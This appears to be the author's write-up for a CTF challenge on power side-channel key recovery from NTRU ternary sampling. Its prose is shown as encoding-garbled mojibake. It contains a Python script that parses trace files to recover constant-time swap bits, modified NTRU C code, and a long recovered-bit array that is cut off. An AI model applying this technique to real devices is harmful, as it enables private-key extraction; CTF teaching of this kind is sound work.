<p>NTRUå®ç°æœ‰å¾ˆå¤šç§ç‰ˆæœ¬ï¼Œå„æœ‰ç»†å¾®å·®å¼‚è¿˜éƒ½æ˜¯å®˜æ–¹çš„ã€‚ç¬¬ä¸‰è½®æäº¤æ–‡æ¡£ä¸­ä¸»è¦æ˜¯åˆ†ä¸ºsteam Primeè¿˜æ˜¯LPRrimeï¼Œä½†æ˜¯å®˜æ–¹çš„ä»£ç åˆåˆ†hpså’Œhrssä¸¤å¥—ç®—æ³•å®ç°ç‰ˆæœ¬ï¼Œå¯¹åº”çš„å‚æ•°ä¸å¤ªä¸€è‡´ï¼›é™¤æ­¤ä¹‹å¤–ä¹‹å‰çš„NTRU open projectå®ç°è¿˜æœ‰å…·ä½“å·®å¼‚ï¼Œä½†ä»£ç åˆ æ¡£äº†ï¼Œæ— ä»è€ƒè¯ã€‚è¿™æ¬¡å‡ºé¢˜æ¶‰åŠåˆ°sampleä¸»è¦æ˜¯åœ¨hpsä¸­ï¼Œhrssç³»åˆ—ä½¿ç”¨çš„é‡‡æ ·ä¸å®Œå…¨ä¸€è‡´ï¼Œå…ˆæ‰¾äº†ç›¸å¯¹å¥½å®ç°çš„ã€‚</p>
<p>NTRUä¸‰å…ƒå¤šé¡¹å¼é‡‡æ ·çš„æ•´ä½“æ€æƒ³æ˜¯ï¼Œå…ˆé‡‡æ ·å¤§é‡çš„éšæœºæ•°ï¼Œç„¶ååœ¨éšæœºæ•°åé™„åŠ 2bitçš„ä¸‰å…ƒä¿¡æ¯ï¼ˆ0ï¼Œ1ï¼Œ2ï¼Œå…¶ä¸­2ä»£è¡¨-1ï¼‰ï¼Œç„¶åå¯¹æ•°ç»„æ‰§è¡Œä¸€éç±»ä¼¼å¿«æ’çš„ç®—æ³•ï¼ˆä½†ä¹Ÿä¸å…¨æ˜¯ï¼Œæ„Ÿè§‰æœ‰ç‚¹å°å·®å¼‚ï¼‰ã€‚ä¸ºä¿è¯äº¤æ¢ä¸ä¼šäº§ç”Ÿæ˜æ˜¾çš„timingé—®é¢˜ï¼Œå¹¶æ›´åŠ è´´åˆç¡¬ä»¶æ‰§è¡Œï¼Œäº¤æ¢çš„ç®—æ³•æ¯”è¾ƒæœ‰æ„æ€ï¼šç”¨äº†ä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„æ¯”è¾ƒç³»ç»Ÿï¼Œç„¶ååˆ©ç”¨å¼‚æˆ–çš„é€»è¾‘ï¼Œå¦‚æœä¸éœ€è¦äº¤æ¢é‚£ä¹ˆæ©ç ä¸º0ï¼Œæ•´ä½“éƒ½å¼‚æˆ–0ï¼Œäºæ˜¯ä¸äº¤æ¢ï¼›è€Œå¦‚æœéœ€è¦äº¤æ¢ï¼Œåˆ™å°†æ©ç è®¾ä¸ºå…¨1ï¼Œè¿™æ ·å°±å¯ä»¥ç•™ä¸‹a^bçš„ç»“æœï¼Œæ¯ä¸ªå€¼éƒ½å¼‚æˆ–ä»–ï¼Œè‡ªç„¶å°±å¾—åˆ°äº†äº¤æ¢çš„ç»“æœã€‚è¿™ä¸ªå†™æ³•è§„é¿äº†åˆ†æ”¯åˆ¤æ–­ä¼šå¸¦æ¥çš„æ—¶åºå·®å¼‚ï¼Œä½†æ˜¯ç”±äºè¿™ä¸ªæ©ç å…¨0è¿˜æ˜¯å…¨1æœ‰æ˜æ˜¾çš„æ±‰æ˜é‡å·®å¼‚ï¼Œæ‰€ä»¥å¯ä»¥çŒœæµ‹ä¼šæœ‰æ˜æ˜¾çš„å®é™…ç”µæºä¿¡å·å·®å¼‚ï¼ŒåŸä½œè€…çš„å®éªŒç»“æœä¹Ÿå¦‚æ˜¯ã€‚é‚£ä¹ˆæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯å‘ç°å¹¶è¿˜åŸè¿™ä¸€ç»„äº¤æ¢ä¿¡å·ï¼Œè‡ªç„¶å°±çŸ¥é“æ’åºåçš„ç§é’¥è¡¨è¾¾å¼å¦‚ä½•äº†ã€‚</p>
<p>ä½†å®é™…é‡åˆ°ä¸€äº›éš¾é‡‡æ ·çš„é—®é¢˜æ˜¯ï¼Œç”±äºæ ‡å‡†å®ç°ä¸­è¿™ä¸ªç½®æ¢æ˜¯é€šè¿‡å®å®šä¹‰å®ç°çš„ï¼Œè€Œè¿™æ®µä»£ç åˆæ˜¯ä¸€ä¸ªçº¯æ•°æ®æµä»£ç ï¼Œæ²¡ä»€ä¹ˆæ§åˆ¶æ€§çš„ä»£ç ï¼Œæ‰€ä»¥å…¶åˆ†ç•Œçº¿å¾ˆæ¨¡ç³Šï¼Œæ—¶é—´ç‰‡ä¹Ÿä¸ç¨³å®šï¼ˆå› ä¸ºç¨‹åºè°ƒç”¨ä¸­é—´æ—¶é—´å·®å¾ˆå¤šï¼Œæœ€çŸ­æœ€é•¿èƒ½å·®å‡ºä¸¤å€ï¼‰æˆ–è®¸é€šè¿‡ç”µæºæ¨¡å‹å¥½æ‰¾ç›¸å…³æ€§ï¼Œä½†æ˜¯åœ¨æ±‰æ˜é‡æ¨¡å‹ä¸‹å¤ªå®¹æ˜“å‡ºé”™äº†ï¼Œè€Œè¿™ä¸ªé¡ºåºåºåˆ—å¯¹è¯¯æŠ¥åˆå¾ˆä¸¥è‹›ï¼Œæ‰€ä»¥è¿™ä¹ˆå‡ºé¢˜ä¹Ÿå¤ªæŠ˜ç£¨é€‰æ‰‹äº†ï¼Œæ‰€ä»¥æœ€åå°†å®å®šä¹‰å†™æˆå‡½æ•°ï¼Œåˆ©ç”¨å‡½æ•°è°ƒç”¨æ˜¯å‹æ ˆè·³è½¬çš„æ§åˆ¶æµæ¥åšåˆ†ç•Œï¼Œæ–¹ä¾¿äº›ã€‚</p>
<p>ç†æ¸…è¿™ä¸ªæ€è·¯ï¼Œå¹¶ç†Ÿæ‚‰trsfileå’Œpltä¹‹åï¼Œå…¶å®å®é™…åšé¢˜å°±å¾ˆå®¹æ˜“äº†ï¼šå…ˆæ‰’å‚æ•°ï¼ˆä½¿ç”¨çš„æ˜¯æ¯”è¾ƒå°çš„åŸå§‹å‚æ•°N&#x3D;251,q&#x3D;256,p&#x3D;3,d&#x3D;72ï¼‰ï¼Œç„¶åé€šè¿‡å®˜æ–¹æºç è®¡ç®—æ•æ„Ÿäº¤æ¢éƒ¨åˆ†æ‰§è¡Œäº†å¤šå°‘æ¬¡ï¼Œç„¶ååœ¨trsä¸­å¤§èƒ†çŒœæµ‹ï¼ˆæŒ‡å·²çŸ¥æ•æ„Ÿä¿¡æ¯æ˜¯32å’Œ0ï¼Œé‚£ä¹ˆåœ¨ç¤ºä¾‹ä¸­å¯ä»¥çœ‹çœ‹æœ‰ä»€ä¹ˆæƒ…å†µï¼Œç”šè‡³è¯´æ ¹æ®é¢˜ç›®trsç›´æ¥çŒœé—´éš”ï¼Œæ¯•ç«Ÿæ€»æœ‰èƒ½è‚‰çœ¼åˆ†å¸ƒçš„è¿ç»­32çš„æ•°æ®ï¼Œæ¥åˆ¤æ–­æœ€å°è½®é—´éš”ï¼‰å°å¿ƒæ±‚è¯ï¼ˆæ—¢ç„¶çŸ¥é“è¿™ä¸ªé—´éš”æ˜¯å‡½æ•°è°ƒç”¨æ§åˆ¶æµå¼•èµ·çš„ï¼Œé‚£ä¹ˆå…¶ä»–åœ°æ–¹çš„å‡½æ•°è°ƒç”¨ä¼šä¸ä¼šå¯¼è‡´è¯¯æŠ¥ï¼Œæ˜¯ä¸æ˜¯è¿˜æœ‰å¯ä»¥å†åŒºåˆ†çš„ç‰¹å¾ï¼Ÿï¼‰ï¼Œç„¶åæ‰’å‡ºæ¥åºåˆ—ï¼Œå¡è¿›æºç ä¸­é­”æ”¹ä¸€ä¸‹å°±ç›´æ¥æ­£å‘è¿˜åŸäº†ï¼Œä¹Ÿæ²¡æœ‰å¤šå°‘é€†å‘è¦è¯»æ‡‚çš„éƒ¨åˆ†ã€‚</p>
<p>é¢˜ç›®å°†ä¸Šæ¶æ”»é˜²ä¸–ç•Œï¼Œä¸å†èµ˜è¿°ï¼Œå¯è§é™„ä»¶ã€‚</p>
<p>wpä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np                                                        </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt                                           </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> trsfile</span><br><span class="line">task=trsfile.<span class="built_in">open</span>(<span class="string">&#x27;/home/zuni-w/Desktop/catctf/sample_wp/task.trs&#x27;</span>  ,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">t=[i  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>,<span class="built_in">len</span>(task[<span class="number">0</span>])-<span class="number">2</span>) <span class="keyword">if</span> task[<span class="number">0</span>][i-<span class="number">1</span>]==<span class="number">0</span> <span class="keyword">and</span> task[<span class="number">0</span>][i] <span class="keyword">in</span> &#123;<span class="number">19</span>,<span class="number">20</span>,<span class="number">22</span>&#125; <span class="keyword">and</span> task[<span class="number">0</span>][i+<span class="number">1</span>]==<span class="number">0</span> <span class="keyword">and</span> task[<span class="number">0</span>][i+<span class="number">2</span>]==<span class="number">0</span> ]</span><br><span class="line">n=[-<span class="number">1</span> <span class="keyword">if</span> <span class="number">32</span> <span class="keyword">in</span> task[<span class="number">0</span>][x:y] <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(t,t[<span class="number">1</span>:]+[-<span class="number">1</span>])]</span><br><span class="line"><span class="built_in">print</span>(n)</span><br></pre></td></tr></table></figure>

<p>C æºç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#define int32 int32_t</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define int32_MINMAX(a,b) \</span></span><br><span class="line">do &#123; \</span><br><span class="line">  int32_t ab = (b) ^ (a); \</span><br><span class="line">  int32_t c = ((b) - (a)); \</span><br><span class="line">  c ^= ab &amp; (c ^ (b)); \</span><br><span class="line">  c &gt;&gt;= <span class="number">31</span>; \</span><br><span class="line">  printf(<span class="string">&quot;%d,&quot;</span>,c);\</span><br><span class="line">  c = ab; \</span><br><span class="line">  (a) ^= c; \</span><br><span class="line">  (b) ^= c; \</span><br><span class="line">  count++;  \  </span><br><span class="line">&#125; <span class="keyword">while</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">int</span> n[<span class="number">3773</span>]=</span><br><span class="line">&#123;</span><br><span class="line">-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span 